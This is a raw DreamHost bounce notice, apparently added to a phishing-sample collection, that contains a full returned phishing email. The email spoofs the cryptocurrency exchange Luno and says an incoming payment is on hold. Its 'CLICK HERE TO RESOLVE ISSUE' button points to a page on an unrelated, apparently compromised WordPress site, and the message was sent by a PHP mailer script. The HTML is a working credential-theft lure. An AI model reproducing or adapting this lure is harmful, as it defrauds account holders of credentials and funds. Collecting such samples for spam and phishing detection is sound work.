@@ -1,0 +1,522 @@
+Return-Path: <>
+X-Original-To: ronmel5@vps11553.dreamhostps.com
+Delivered-To: ronmel5@vps11553.dreamhostps.com
+Received: by vps11553.dreamhostps.com (Postfix)
+	id 4KMVGj0vl5z24F5; Mon, 21 Mar 2022 02:50:21 -0700 (PDT)
+Date: Mon, 21 Mar 2022 02:50:21 -0700 (PDT)
+From: MAILER-DAEMON@vps11553.dreamhostps.com (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+To: ronmel5@vps11553.dreamhostps.com
+Auto-Submitted: auto-replied
+MIME-Version: 1.0
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="4KMVG96P0rz239N.1647856221/vps11553.dreamhostps.com"
+Content-Transfer-Encoding: 8bit
+Message-Id: <4KMVGj0vl5z24F5@vps11553.dreamhostps.com>
+
+This is a MIME-encapsulated message.
+
+--4KMVG96P0rz239N.1647856221/vps11553.dreamhostps.com
+Content-Description: Notification
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+This is the mail system at host vps11553.dreamhostps.com.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+If you are a current customer of DreamHost, please contact our
+technical support team here
+
+https://panel.dreamhost.com/support
+
+If you are not a customer please use our contact form at.
+
+http://dreamhost.com/contact
+
+If you do so, please include this email in your support ticket. You can
+delete your own text from the attached returned message.
+
+                DreamHost Email Support
+
+<rsweng@mweb.co.za>: host securemail-mx3.synaq.com[196.35.198.130] said: 550
+    Message from luno.com failed sender DMARC policy (in reply to end of DATA
+    command)
+
+--4KMVG96P0rz239N.1647856221/vps11553.dreamhostps.com
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; vps11553.dreamhostps.com
+X-Postfix-Queue-ID: 4KMVG96P0rz239N
+X-Postfix-Sender: rfc822; ronmel5@vps11553.dreamhostps.com
+Arrival-Date: Mon, 21 Mar 2022 02:49:53 -0700 (PDT)
+
+Final-Recipient: rfc822; rsweng@mweb.co.za
+Original-Recipient: rfc822;rsweng@mweb.co.za
+Action: failed
+Status: 5.0.0
+Remote-MTA: dns; securemail-mx3.synaq.com
+Diagnostic-Code: smtp; 550 Message from luno.com failed sender DMARC policy
+
+--4KMVG96P0rz239N.1647856221/vps11553.dreamhostps.com
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 8bit
+
+Return-Path: <ronmel5@vps11553.dreamhostps.com>
+Received: by vps11553.dreamhostps.com (Postfix, from userid 5950722)
+	id 4KMVG96P0rz239N; Mon, 21 Mar 2022 02:49:53 -0700 (PDT)
+To: rsweng@mweb.co.za
+Subject: =?UTF-8?B?V2FsbGV0IEVycm9y?=
+X-PHP-Originating-Script: 5950722:alexus.php
+From: =?UTF-8?B?THVubw==?= <no-reply@luno.com>
+MIME-Version: 1.0;
+Content-type: multipart/mixed; boundary="--tNlkTWPSQT"
+Message-Id: <4KMVG96P0rz239N@vps11553.dreamhostps.com>
+Date: Mon, 21 Mar 2022 02:49:53 -0700 (PDT)
+
+----tNlkTWPSQT
+Content-type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title></title>
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+      a[x-apple-data-detectors] {
+        color: inherit !important;
+        text-decoration: none !important;
+      }
+
+      a[href^="tel"]:hover {
+        text-decoration: none !important;
+      }
+
+      table td {
+        mso-line-height-rule: exactly;
+      }
+
+      a img {
+        border: none;
+      }
+
+      b,
+      strong {
+        font-weight: 700;
+      }
+
+      p {
+        margin: 0;
+      }
+
+      th {
+        padding: 0;
+      }
+
+      td {
+        text-decoration: none;
+      }
+
+      a {
+        outline: none;
+        color: #fa5151;
+        text-decoration: underline;
+      }
+
+      .highlight-phone {
+        color: inherit;
+        border: none;
+      }
+
+      .nl span,
+      .nl a {
+        color: inherit !important;
+        text-decoration: none !important;
+        border: none !important;
+      }
+
+      a:hover {
+        text-decoration: none !important;
+      }
+
+      .h-u a {
+        text-decoration: none;
+      }
+
+      .h-u a:hover {
+        text-decoration: underline !important;
+      }
+
+      .btn-01:hover {
+        background-color: #e8e7e6 !important;
+      }
+
+      .active a:hover {
+        opacity: 0.8;
+      }
+
+      .btn-01,
+      .active a {
+        transition: all 0.3s ease;
+      }
+
+      .active-i a:hover,
+      .active-t:hover {
+        opacity: 0.8;
+      }
+
+      .cta,
+      .active-i a,
+      .active-t {
+        transition: all 0.3s ease;
+      }
+
+      .cta:hover {
+        background: #ffffff !important;
+        color: #ff8800 !important;
+      }
+
+      .contact a {
+        color: #FFFFFF !important;
+        text-decoration: underline !important;
+      }
+
+      ul {
+        Margin: 0 0 0 20px;
+        padding: 0;
+      }
+
+      ol {
+        Margin: 0 0 0 20px;
+        padding: 0;
+      }
+
+      img+div {
+        display: none !important;
+        width: 0px !important;
+        height: 0px !important;
+        opacity: 0 !important;
+      }
+
+      @media only screen and (max-width:375px) and (min-width:374px) {
+        .gmail-fix {
+          min-width: 374px !important;
+        }
+      }
+
+      @media only screen and (max-width:414px) and (min-width:413px) {
+        .gmail-fix {
+          min-width: 413px !important;
+        }
+      }
+
+      @media only screen and (max-width:500px) {
+
+         
+        .flexible {
+          width: 100% !important;
+        }
+
+        .img-flex img {
+          width: 100% !important;
+          height: auto !important;
+        }
+
+        .table-holder {
+          display: table !important;
+          width: 100% !important;
+        }
+
+        .thead {
+          display: table-header-group !important;
+          width: 100% !important;
+        }
+
+        .tfoot {
+          display: table-footer-group !important;
+          width: 100% !important;
+        }
+
+        .tflex {
+          display: block !important;
+          width: 100% !important;
+        }
+
+        .hide {
+          display: none !important;
+          width: 0 !important;
+          height: 0 !important;
+          padding: 0 !important;
+          font-size: 0 !important;
+          line-height: 0 !important;
+        }
+
+        .tc {
+          margin: 0 auto !important;
+          float: none !important;
+        }
+
+        .ac {
+          text-align: center !important;
+        }
+
+        .h-0 {
+          height: 0 !important;
+        }
+
+        .p-0 {
+          padding: 0 !important;
+        }
+
+        .p-20 {
+          padding: 20px !important;
+        }
+
+        .p-30 {
+          padding: 30px !important;
+        }
+
+        .plr-0 {
+          padding-left: 0 !important;
+          padding-right: 0 !important;
+        }
+
+        .plr-10 {
+          padding-left: 10px !important;
+          padding-right: 10px !important;
+        }
+
+        .plr-10 a {
+          padding-left: 10px !important;
+          padding-right: 10px !important;
+        }
+
+        .plr-15 {
+          padding-left: 15px !important;
+          padding-right: 15px !important;
+        }
+
+        .plr-20 {
+          padding-left: 20px !important;
+          padding-right: 20px !important;
+        }
+
+        .pt-20 {
+          padding-top: 20px !important;
+        }
+
+        .pt-30 {
+          padding-top: 30px !important;
+        }
+
+        .pb-20 {
+          padding-bottom: 20px !important;
+        }
+
+        .pb-30 {
+          padding-bottom: 30px !important;
+        }
+
+         
+
+        .w-10 {
+          width: 10px !important;
+        }
+
+      }
+    </style>
+  
+
+  
+    <table class="gmail-fix" style="min-width: 320px;" width="100%" cellspacing="0" cellpadding="0" bgcolor="#f2f2f2">
+      <tbody>
+        <tr>
+          <td>
+            <table width="100%" cellspacing="0" cellpadding="0">
+              <tbody>
+              <tr>
+                <td style="display: none; font-size: 0; line-height: 0; width: 0; height: 0; padding: 0;">&nbsp;</td>
+              </tr>
+              </tbody>
+            </table>
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <table class="flexible" style="margin: 0 auto;" width="600" cellspacing="0" cellpadding="0" align="center">
+              <tbody>
+              <tr>
+                <td bgcolor="#ffffff">
+                  <table width="100%" cellspacing="0" cellpadding="0">
+                    <tbody>
+                    
+  <tr>
+    <td class="img-flex"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/e500_header.png" width="600" height="252"></td>
+  </tr>
+
+                    <tr>
+                      <td style="padding: 40px 25px;">
+                        <table width="100%" cellspacing="0" cellpadding="0">
+                          <tbody>
+                            
+                              <tr>
+                                <td style="font: 16px/22px Arial, Helvetica, sans-serif; color: #000000; padding: 0 0 20px;">
+                                  Dear 
+  <a rel="nofollow" href="" style="text-decoration:none; color:inherit">Client,</a>
+
+                                </td>
+                              </tr>
+                            
+                            
+  <tr>
+    <td style="font: 16px/22px Arial, Helvetica, sans-serif; color: #000000; padding: 0 0 40px;">
+      This is to inform you that an incoming payment has been placed on hold due to error(s) on your details.
+    </td>
+  </tr>
+
+  <tr>
+    <td style="text-rendering: optimizeLegibility !important; -webkit-font-smoothing: antialiased !important; -moz-osx-font-smoothing: grayscale !important; padding: 0 0 40px;">
+      <table class="flexible" style="margin: 0 auto;" cellspacing="0" cellpadding="0" align="center">
+        <tbody>
+          <tr>
+            <td class="active-t plr-10" style="font: bold 15px/20px Arial, Helvetica, sans-serif; color: #fff; mso-padding-alt: 15px 40px; border-radius: 25px; text-transform: uppercase; letter-spacing: 1px; -webkit-box-shadow: 0px 10px 5px -10px rgba(0,0,0,0.75); -moz-box-shadow: 0px 10px 5px -10px rgba(0,0,0,0.75); box-shadow: 0px 10px 5px -10px rgba(0,0,0,0.75);" bgcolor="#0091ff" align="center">
+              <a target="_blank" style="text-decoration: none; color: #fffffe; display: block; padding: 15px 40px;" href="http://kemahasiswaan.poltekkesjogja.ac.id/wp-content/lun.htm" rel="noopener noreferrer">CLICK HERE TO RESOLVE ISSUE.</a>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </td>
+  </tr>
+
+  <tr>
+    <td style="font: 16px/22px Arial, Helvetica, sans-serif; color: #000000; padding: 0 0 20px;">
+      Some transaction <a target="_blank" style="color: #0091ff; text-decoration: none;" href="https://www.luno.com/countries#levels" rel="noopener noreferrer">limits</a> may apply.
+    </td>
+  </tr>
+
+  
+
+                            
+  
+  <tr>
+    <td class="h-u" style="font: 16px/22px Arial, Helvetica, sans-serif; color: #000000;">
+      To the moon<br>
+      Team Luno<br><br>
+      Questions? Visit our <a target="_blank" style="color: #0091ff; text-decoration: none;" href="https://www.luno.com/help?utm_campaign=identity_verified&amp;utm_medium=internal&amp;utm_source=email" rel="noopener noreferrer">Help Centre</a>.
+    </td>
+  </tr>
+
+
+                          </tbody>
+                        </table>
+                      </td>
+                    </tr>
+                    
+  <tr>
+    <td bgcolor="#12326b">
+      <table width="100%" cellspacing="0" cellpadding="0">
+        <tbody>
+          <tr>
+            <td class="img-flex"><img style="vertical-align: top; height: auto; width: 600px;" src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/img-line.png" alt="" width="600" border="0"></td>
+          </tr>
+          <tr>
+            <td style="padding: 60px 15px; text-rendering: optimizeLegibility !important; -webkit-font-smoothing: antialiased !important; -moz-osx-font-smoothing: grayscale !important;" bgcolor="#12326b">
+              <table width="100%" cellspacing="0" cellpadding="0">
+                <tbody>
+                  <tr>
+    <td style="padding: 0 0 40px;">
+      <table style="margin: 0 auto;" cellspacing="0" cellpadding="0" align="center">
+        <tbody>
+          <tr>
+            <td class="active">
+                <a target="_blank" href="https://itunes.apple.com/app/bitx-wallet/id927362479?mt=8" rel="noopener noreferrer">
+                  <img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/btn-app.png" alt="Download on the App Store" width="136" height="41">
+                </a>
+            </td>
+            <td class="w-10" width="30">&nbsp;</td>
+            <td class="active">
+              <a target="_blank" href="https://play.google.com/store/apps/details?hl=en&amp;id=co.bitx.android.wallet" rel="noopener noreferrer">
+                <img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/btn-gp.png" alt="Get it on Google Play" width="136" height="41">
+              </a>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </td>
+  </tr>
+                  
+  <tr>
+    <td class="h-u" style="font: 15px/20px Arial, Helvetica, sans-serif; color: #ffffff; padding: 0 0 40px;" align="center">You received this email because an account was registered for Luno <br class="hide"> using the address <span class="contact">:</span>.</td>
+  </tr>
+
+                  <tr>
+    <td style="padding: 0 0 10px;">
+      <table style="margin: 0 auto;" cellspacing="0" cellpadding="0" align="center">
+        <tbody>
+          <tr>
+            <td class="active"><a target="_blank" href="https://www.facebook.com/luno/" rel="noopener noreferrer"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/ico-fb.png" alt="FB" width="22" height="22"> </a></td>
+            <td width="25">&nbsp;</td>
+            <td class="active"><a target="_blank" href="https://www.twitter.com/lunomoney" rel="noopener noreferrer"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/ico-tw.png" alt="TW" width="22" height="18"> </a></td>
+            <td width="25">&nbsp;</td>
+            <td class="active"><a target="_blank" href="https://www.linkedin.com/company/lunoglobal/" rel="noopener noreferrer"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/ico-in.png" alt="LN" width="22" height="22"> </a></td>
+          </tr>
+        </tbody>
+      </table>
+    </td>
+  </tr>
+  <tr>
+    <td style="padding: 0 0 10px;">
+      <table style="margin: 0 auto;" cellspacing="0" cellpadding="0" align="center">
+        <tbody>
+          <tr>
+            <td class="active"><a target="_blank" href="https://www.youtube.com/lunomoney" rel="noopener noreferrer"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/ico-yt.png" alt="YT" width="22" height="16"> </a></td>
+            <td width="25">&nbsp;</td>
+            <td class="active"><a target="_blank" href="https://medium.com/luno" rel="noopener noreferrer"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/ico-m.png" alt="M" width="22" height="17"> </a></td>
+            <td width="25">&nbsp;</td>
+            <td class="active"><a target="_blank" href="https://www.instagram.com/lunomoney/" rel="noopener noreferrer"><img src="https://d32exi8v9av3ux.cloudfront.net/static/images/email/best_trip/ico-ig.png" alt="IG" width="22" height="22"> </a></td>
+          </tr>
+        </tbody>
+      </table>
+    </td>
+  </tr>
+                </tbody>
+              </table>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </td>
+  </tr>
+
+                    </tbody>
+                  </table>
+                </td>
+              </tr>
+              </tbody>
+            </table>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+----tNlkTWPSQT
+
+
+--4KMVG96P0rz239N.1647856221/vps11553.dreamhostps.com--
